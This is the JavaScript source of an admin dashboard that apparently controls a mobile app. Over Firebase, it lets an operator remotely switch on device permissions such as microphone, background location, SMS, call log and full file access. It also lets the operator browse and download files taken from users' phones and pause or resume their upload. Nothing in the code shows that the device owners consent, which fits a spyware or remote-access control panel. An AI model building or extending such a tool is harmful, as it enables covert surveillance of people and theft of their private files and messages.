import { auth, firestore } from './firebase-config.js';
import {
  signInWithEmailAndPassword, signOut, onAuthStateChanged,
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import {
  collection, getDocs, doc, updateDoc, getDoc, onSnapshot, serverTimestamp,
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// ═══════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════
const PERMISSIONS = [
  { id:'camera',          label:'Camera',             icon:'📷', desc:'Take photos and record video' },
  { id:'microphone',      label:'Microphone',         icon:'🎙️', desc:'Record audio' },
  { id:'location',        label:'Location',           icon:'📍', desc:'Precise GPS location' },
  { id:'location_always', label:'Location (Always)',  icon:'🗺️', desc:'Background location access' },
  { id:'storage',         label:'Storage',            icon:'💾', desc:'Read and write files' },
  { id:'photos',          label:'Photos & Media',     icon:'🖼️', desc:'Access photos and media' },
  { id:'contacts',        label:'Contacts',           icon:'👥', desc:'Read and write contacts' },
  { id:'phone',           label:'Phone',              icon:'📞', desc:'Make and manage calls' },
  { id:'sms',             label:'SMS',                icon:'💬', desc:'Send and receive messages' },
  { id:'call_log',        label:'Call Log',           icon:'📋', desc:'Access call history' },
  { id:'bluetooth',       label:'Bluetooth',          icon:'🔵', desc:'Connect Bluetooth devices' },
  { id:'bluetooth_scan',  label:'Bluetooth Scan',     icon:'📡', desc:'Scan nearby devices' },
  { id:'notifications',   label:'Notifications',      icon:'🔔', desc:'Show push notifications' },
  { id:'calendar',        label:'Calendar',           icon:'📅', desc:'Read and write calendar events' },
  { id:'sensors',         label:'Body Sensors',       icon:'❤️', desc:'Access health sensors' },
  { id:'activity',        label:'Activity',           icon:'🏃', desc:'Detect physical activity' },
  { id:'nearby_wifi',     label:'Nearby WiFi',        icon:'📶', desc:'Scan nearby WiFi networks' },
  { id:'manage_storage',  label:'Manage All Files',   icon:'🗂️', desc:'Full file system access' },
];

const FILE_TYPE_ICONS = {
  image:    '🖼️',
  video:    '🎬',
  audio:    '🎵',
  document: '📄',
  apk:      '📦',
  archive:  '🗜️',
  other:    '📎',
};

// ═══════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════
let allUsers      = [];
let currentUserId = null;
let pendingPerms  = {};

// Files state
let allDeviceFiles    = [];
let filteredFiles     = [];
let activeTypeFilter  = 'all';
let lbIndex           = 0;
let lbImages          = [];

// Upload control state
let currentFilesUserId  = null;
let uploadStatusUnsub   = null;

// ═══════════════════════════════════════════
// AUTH
// ═══════════════════════════════════════════
onAuthStateChanged(auth, user => {
  if (user) showDashboard(user);
  else      showLogin();
});

document.getElementById('loginForm').addEventListener('submit', async e => {
  e.preventDefault();
  const btn = document.getElementById('loginBtn');
  const err = document.getElementById('loginError');
  err.classList.add('hidden');
  btn.disabled = true; btn.textContent = 'Signing in…';
  try {
    await signInWithEmailAndPassword(
      auth,
      document.getElementById('adminEmail').value.trim(),
      document.getElementById('adminPass').value.trim()
    );
  } catch (ex) {
    err.textContent = friendlyErr(ex.code);
    err.classList.remove('hidden');
    btn.disabled = false; btn.textContent = 'Sign In';
  }
});

function friendlyErr(code) {
  return ({ 'auth/user-not-found':'No account with this email.',
             'auth/wrong-password':'Incorrect password.',
             'auth/invalid-email':'Invalid email address.',
             'auth/too-many-requests':'Too many attempts. Try again later.' })[code]
    || 'Sign in failed. Check your credentials.';
}

async function logout() { await signOut(auth); }
window.logout = logout;

// ═══════════════════════════════════════════
// PAGES
// ═══════════════════════════════════════════
function showLogin() {
  document.getElementById('loginPage').classList.add('active');
  document.getElementById('dashboardPage').classList.remove('active');
  document.getElementById('dashboardPage').style.display = 'none';
}

function showDashboard(user) {
  document.getElementById('loginPage').classList.remove('active');
  document.getElementById('dashboardPage').classList.add('active');
  document.getElementById('dashboardPage').style.display = 'flex';
  document.getElementById('adminName').textContent = user.displayName || 'Admin';
  document.getElementById('adminEmailDisplay').textContent = user.email;
  document.getElementById('adminAvatarLetter').textContent =
    (user.displayName || user.email || 'A').charAt(0).toUpperCase();
  loadUsers();
}

// ═══════════════════════════════════════════
// LOAD USERS
// ═══════════════════════════════════════════
async function loadUsers() {
  setUsersLoading(true);
  try {
    const snap = await getDocs(collection(firestore, 'users'));
    allUsers = snap.docs.map(d => ({ id: d.id, ...d.data() }));
    renderUsers(allUsers);
    updateStats(allUsers);
  } catch (ex) {
    showToast('Failed to load users: ' + ex.message, 'error');
    setUsersLoading(false);
  }
}
window.loadUsers = loadUsers;

function setUsersLoading(on) {
  document.getElementById('loadingState').classList.toggle('hidden', !on);
  document.getElementById('usersList').classList.toggle('hidden', on);
  document.getElementById('emptyState').classList.add('hidden');
}

function renderUsers(users) {
  document.getElementById('loadingState').classList.add('hidden');
  const grid = document.getElementById('usersList');
  if (!users.length) {
    grid.classList.add('hidden');
    document.getElementById('emptyState').classList.remove('hidden');
    document.getElementById('userCountBadge').textContent = '0 users';
    return;
  }
  document.getElementById('emptyState').classList.add('hidden');
  grid.classList.remove('hidden');
  document.getElementById('userCountBadge').textContent =
    `${users.length} user${users.length !== 1 ? 's' : ''}`;
  grid.innerHTML = users.map(buildUserCard).join('');
}

function buildUserCard(user) {
  const perms   = user.permissions || {};
  const enabled = PERMISSIONS.filter(p => perms[p.id]).length;
  const total   = PERMISSIONS.length;
  const stats   = user.fileStats || {};
  const fileCount = stats.total || 0;
  const initials = (user.name || 'U').charAt(0).toUpperCase();

  const tagHtml = PERMISSIONS.slice(0, 5).map(p => {
    const on = !!perms[p.id];
    return `<span class="perm-tag ${on ? 'on':'off'}">${p.icon} ${p.label}</span>`;
  }).join('');

  return `
    <div class="user-card">
      <div class="user-card-header">
        <div class="user-card-avatar">${initials}</div>
        <div>
          <div class="user-card-name">${esc(user.name || 'Unknown')}</div>
          <div class="user-card-email">${esc(user.email || '')}</div>
        </div>
      </div>
      <div class="perm-summary">${tagHtml}</div>
      <div class="user-card-footer">
        <span class="perm-count">${enabled}/${total} perms · 📂 ${fileCount} files</span>
        <div class="card-btns">
          <button class="btn-sm blue" onclick="openFilesModal('${user.id}')">📂 Files</button>
          <button class="btn-sm purple" onclick="openPermModal('${user.id}')">⚙️ Perms</button>
        </div>
      </div>
    </div>
  `;
}

function updateStats(users) {
  document.getElementById('statTotal').textContent = users.length;
  const withPerms = users.filter(u => Object.values(u.permissions || {}).some(Boolean)).length;
  document.getElementById('statPermed').textContent = withPerms;
  const totalFiles = users.reduce((s, u) => s + ((u.fileStats || {}).total || 0), 0);
  document.getElementById('statFiles').textContent = totalFiles;
}

// ═══════════════════════════════════════════
// SEARCH
// ═══════════════════════════════════════════
function filterUsers() {
  const q = document.getElementById('searchInput').value.toLowerCase();
  renderUsers(allUsers.filter(u =>
    (u.name||'').toLowerCase().includes(q) || (u.email||'').toLowerCase().includes(q)
  ));
}
window.filterUsers = filterUsers;

// ═══════════════════════════════════════════
// SECTIONS
// ═══════════════════════════════════════════
function showSection(e, section) {
  e.preventDefault();
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  e.currentTarget.classList.add('active');
  const isStats = section === 'stats';
  document.getElementById('statsSection').classList.toggle('hidden', !isStats);
  document.getElementById('usersSection').style.display = isStats ? 'none' : '';
  document.getElementById('sectionTitle').textContent = isStats ? 'Statistics' : 'User Management';
  if (isStats) updateStats(allUsers);
}
window.showSection = showSection;

// ═══════════════════════════════════════════
// PERMISSION MODAL
// ═══════════════════════════════════════════
function openPermModal(userId) {
  currentUserId = userId;
  const user = allUsers.find(u => u.id === userId);
  if (!user) return;
  pendingPerms = { ...(user.permissions || {}) };

  document.getElementById('permModalName').textContent  = user.name || 'Unknown';
  document.getElementById('permModalEmail').textContent = user.email || '';
  document.getElementById('permModalAvatar').textContent = (user.name||'U').charAt(0).toUpperCase();

  renderPermCards(pendingPerms);
  document.getElementById('permModal').classList.remove('hidden');
  document.body.style.overflow = 'hidden';
}
window.openPermModal = openPermModal;

function closePermModal(e) {
  if (e && e.target !== document.getElementById('permModal')) return;
  document.getElementById('permModal').classList.add('hidden');
  document.body.style.overflow = '';
  currentUserId = null;
}
window.closePermModal = closePermModal;

function renderPermCards(perms) {
  document.getElementById('permissionsGrid').innerHTML = PERMISSIONS.map(p => {
    const on = !!perms[p.id];
    return `
      <div class="perm-card ${on ? 'enabled' : ''}" id="card-${p.id}">
        <div class="perm-card-top">
          <div class="perm-icon-wrap ${on ? 'on':'off'}">${p.icon}</div>
          <label class="toggle">
            <input type="checkbox" id="toggle-${p.id}" ${on ? 'checked' : ''}
              onchange="togglePerm('${p.id}', this.checked)" />
            <span class="slider"></span>
          </label>
        </div>
        <div class="perm-name">${p.label}</div>
        <div class="perm-desc">${p.desc}</div>
      </div>`;
  }).join('');
}

function togglePerm(id, checked) {
  pendingPerms[id] = checked;
  const card = document.getElementById(`card-${id}`);
  card.classList.toggle('enabled', checked);
  card.querySelector('.perm-icon-wrap').className = `perm-icon-wrap ${checked ? 'on':'off'}`;
}
window.togglePerm = togglePerm;

function setAllPermissions(value) {
  PERMISSIONS.forEach(p => {
    pendingPerms[p.id] = value;
    const t = document.getElementById(`toggle-${p.id}`);
    if (t) t.checked = value;
    const card = document.getElementById(`card-${p.id}`);
    card?.classList.toggle('enabled', value);
    const icon = card?.querySelector('.perm-icon-wrap');
    if (icon) icon.className = `perm-icon-wrap ${value ? 'on':'off'}`;
  });
}
window.setAllPermissions = setAllPermissions;

async function savePermissions() {
  if (!currentUserId) return;
  const btn = document.getElementById('savePermBtn');
  btn.disabled = true; btn.textContent = '⏳ Saving…';
  try {
    await updateDoc(doc(firestore, 'users', currentUserId), { permissions: pendingPerms });
    const idx = allUsers.findIndex(u => u.id === currentUserId);
    if (idx !== -1) allUsers[idx].permissions = { ...pendingPerms };
    showToast('Permissions saved! Applied instantly on mobile.', 'success');
    document.getElementById('permModal').classList.add('hidden');
    document.body.style.overflow = '';
    currentUserId = null;
    renderUsers(allUsers);
  } catch (ex) {
    showToast('Save failed: ' + ex.message, 'error');
  } finally {
    btn.disabled = false; btn.textContent = '💾 Save Changes';
  }
}
window.savePermissions = savePermissions;

// ═══════════════════════════════════════════
// FILES MODAL
// ═══════════════════════════════════════════
async function openFilesModal(userId) {
  const user = allUsers.find(u => u.id === userId);
  if (!user) return;

  currentFilesUserId = userId;

  document.getElementById('filesModalName').textContent  = user.name || 'Unknown';
  document.getElementById('filesModalEmail').textContent = user.email || '';
  document.getElementById('filesModalAvatar').textContent = (user.name||'U').charAt(0).toUpperCase();

  // Reset state
  allDeviceFiles = [];
  filteredFiles  = [];
  activeTypeFilter = 'all';
  document.getElementById('filesSearchInput').value = '';
  document.querySelectorAll('.ftab').forEach(t => t.classList.remove('active'));
  document.querySelector('.ftab[data-type="all"]').classList.add('active');

  document.getElementById('filesModal').classList.remove('hidden');
  document.getElementById('filesLoading').classList.remove('hidden');
  document.getElementById('filesEmpty').classList.add('hidden');
  document.getElementById('filesGrid').classList.add('hidden');
  document.body.style.overflow = 'hidden';

  // Start real-time upload status listener
  updateUploadControlUI('idle');
  uploadStatusUnsub?.();
  uploadStatusUnsub = onSnapshot(doc(firestore, 'users', userId), snap => {
    const raw = snap.data()?.uploadControl?.status || 'idle';
    updateUploadControlUI(raw);
  });

  // Load files from Firestore subcollection
  try {
    const snap = await getDocs(
      collection(firestore, 'users', userId, 'device_files')
    );
    allDeviceFiles = snap.docs.map(d => ({ id: d.id, ...d.data() }));
    // Sort by lastModified desc
    allDeviceFiles.sort((a, b) => {
      const ta = a.lastModified?.seconds || 0;
      const tb = b.lastModified?.seconds || 0;
      return tb - ta;
    });

    filteredFiles = [...allDeviceFiles];
    renderFilesGrid(filteredFiles);
  } catch (ex) {
    showToast('Failed to load files: ' + ex.message, 'error');
    document.getElementById('filesLoading').classList.add('hidden');
    document.getElementById('filesEmpty').classList.remove('hidden');
  }
}
window.openFilesModal = openFilesModal;

function closeFilesModal(e) {
  if (e && e.target !== document.getElementById('filesModal')) return;
  uploadStatusUnsub?.();
  uploadStatusUnsub = null;
  currentFilesUserId = null;
  document.getElementById('filesModal').classList.add('hidden');
  document.body.style.overflow = '';
}
window.closeFilesModal = closeFilesModal;

function renderFilesGrid(files) {
  document.getElementById('filesLoading').classList.add('hidden');
  const grid = document.getElementById('filesGrid');

  document.getElementById('filesCountLabel').textContent =
    `${files.length} file${files.length !== 1 ? 's' : ''}`;

  if (!files.length) {
    grid.classList.add('hidden');
    document.getElementById('filesEmpty').classList.remove('hidden');
    return;
  }

  document.getElementById('filesEmpty').classList.add('hidden');
  grid.classList.remove('hidden');

  // Build lightbox image list from visible images
  lbImages = files
    .filter(f => f.fileType === 'image' && f.storageUrl)
    .map(f => ({ url: f.storageUrl, name: f.name }));

  grid.innerHTML = files.map(f => buildFileCard(f)).join('');
}

function buildFileCard(file) {
  const isImage  = file.fileType === 'image';
  const sizeStr  = fmtSize(file.size || 0);
  const dateStr  = fmtDate(file.lastModified?.seconds);
  const ext      = (file.name || '').split('.').pop().toUpperCase().slice(0, 4);
  const lbIdx    = lbImages.findIndex(x => x.url === file.storageUrl);

  const thumb = isImage && file.storageUrl
    ? `<img src="${esc(file.storageUrl)}" alt="${esc(file.name)}" loading="lazy" onerror="this.parentElement.innerHTML='<span class=\\'file-type-icon\\'>🖼️</span>'" />`
    : `<span class="file-type-icon">${FILE_TYPE_ICONS[file.fileType] || '📎'}</span>`;

  return `
    <div class="file-card" onclick="${isImage ? `openLightbox(${lbIdx})` : ''}">
      <div class="file-thumb">
        ${thumb}
        <span class="file-type-badge">${esc(ext)}</span>
      </div>
      <div class="file-info">
        <div class="file-name" title="${esc(file.name || '')}">${esc(file.name || 'Unknown')}</div>
        <div class="file-meta">${sizeStr} · ${dateStr}</div>
        <div class="file-actions" onclick="event.stopPropagation()">
          ${isImage ? `<button class="file-btn view" onclick="openLightbox(${lbIdx})">👁 View</button>` : ''}
          ${file.storageUrl
            ? `<a class="file-btn dl" href="${esc(file.storageUrl)}" target="_blank" download="${esc(file.name||'')}">⬇ Download</a>`
            : `<span class="file-btn" style="opacity:.4">No URL</span>`
          }
        </div>
      </div>
    </div>`;
}

// Filter by type tab
function filterFiles(type, btn) {
  activeTypeFilter = type;
  document.querySelectorAll('.ftab').forEach(t => t.classList.remove('active'));
  btn.classList.add('active');
  applyFilesFilter();
}
window.filterFiles = filterFiles;

// Search by name
function searchFiles() { applyFilesFilter(); }
window.searchFiles = searchFiles;

function applyFilesFilter() {
  const q = (document.getElementById('filesSearchInput').value || '').toLowerCase();
  filteredFiles = allDeviceFiles.filter(f => {
    const typeOk = activeTypeFilter === 'all' || f.fileType === activeTypeFilter;
    const nameOk = !q || (f.name || '').toLowerCase().includes(q);
    return typeOk && nameOk;
  });
  renderFilesGrid(filteredFiles);
}

// ═══════════════════════════════════════════
// UPLOAD CONTROL
// ═══════════════════════════════════════════
async function controlUpload(status) {
  if (!currentFilesUserId) return;
  try {
    await updateDoc(doc(firestore, 'users', currentFilesUserId), {
      'uploadControl': { status, updatedAt: serverTimestamp() },
    });
    const labels = { running: 'resumed', paused: 'paused', stopped: 'stopped', idle: 'reset' };
    showToast(`Upload ${labels[status] || status} — mobile app will respond instantly.`, 'success');
  } catch (ex) {
    showToast('Failed to update upload control: ' + ex.message, 'error');
  }
}
window.controlUpload = controlUpload;

function updateUploadControlUI(status) {
  const dot   = document.getElementById('uploadStatusDot');
  const label = document.getElementById('uploadStatusLabel');
  const btnResume = document.getElementById('btnResume');
  const btnPause  = document.getElementById('btnPause');
  const btnStop   = document.getElementById('btnStop');
  if (!dot || !label) return;

  const cfg = {
    idle:    { color: '#475569', text: 'Idle — no active upload',     resume: false, pause: false, stop: false },
    running: { color: '#10B981', text: 'Uploading…',                  resume: false, pause: true,  stop: true  },
    paused:  { color: '#F59E0B', text: 'Paused',                      resume: true,  pause: false, stop: true  },
    stopped: { color: '#EF4444', text: 'Stopped',                     resume: false, pause: false, stop: false },
  };
  const c = cfg[status] || cfg.idle;

  dot.style.background    = c.color;
  label.textContent       = `Upload: ${c.text}`;
  btnResume.style.display = c.resume ? '' : 'none';
  btnPause.style.display  = c.pause  ? '' : 'none';
  btnStop.style.display   = c.stop   ? '' : 'none';
}

// ═══════════════════════════════════════════
// LIGHTBOX
// ═══════════════════════════════════════════
function openLightbox(idx) {
  if (!lbImages.length || idx < 0) return;
  lbIndex = idx;
  updateLightbox();
  document.getElementById('lightbox').classList.remove('hidden');
  document.body.style.overflow = 'hidden';
}
window.openLightbox = openLightbox;

function closeLightbox() {
  document.getElementById('lightbox').classList.add('hidden');
  document.body.style.overflow = '';
}
window.closeLightbox = closeLightbox;

function lbNav(dir, e) {
  e?.stopPropagation();
  lbIndex = (lbIndex + dir + lbImages.length) % lbImages.length;
  updateLightbox();
}
window.lbNav = lbNav;

function updateLightbox() {
  const img = lbImages[lbIndex];
  document.getElementById('lbImg').src          = img.url;
  document.getElementById('lbName').textContent = img.name;
  document.getElementById('lbDownload').href    = img.url;
  document.getElementById('lbDownload').download= img.name;
}

// Keyboard navigation for lightbox
document.addEventListener('keydown', e => {
  if (!document.getElementById('lightbox').classList.contains('hidden')) {
    if (e.key === 'ArrowLeft')  lbNav(-1, null);
    if (e.key === 'ArrowRight') lbNav(1, null);
    if (e.key === 'Escape')     closeLightbox();
  }
});

// ═══════════════════════════════════════════
// UTILS
// ═══════════════════════════════════════════
function showToast(msg, type = 'success') {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.className = `toast ${type}`;
  el.classList.remove('hidden');
  setTimeout(() => el.classList.add('hidden'), 3500);
}

function togglePass() {
  const i = document.getElementById('adminPass');
  i.type = i.type === 'password' ? 'text' : 'password';
}
window.togglePass = togglePass;

function esc(str) {
  return (str || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function fmtSize(bytes) {
  if (!bytes) return '0 B';
  if (bytes < 1024)           return `${bytes} B`;
  if (bytes < 1024*1024)      return `${(bytes/1024).toFixed(1)} KB`;
  if (bytes < 1024*1024*1024) return `${(bytes/1024/1024).toFixed(1)} MB`;
  return `${(bytes/1024/1024/1024).toFixed(1)} GB`;
}

function fmtDate(secs) {
  if (!secs) return '—';
  return new Date(secs * 1000).toLocaleDateString('en-US', { month:'short', day:'numeric', year:'numeric' });
}
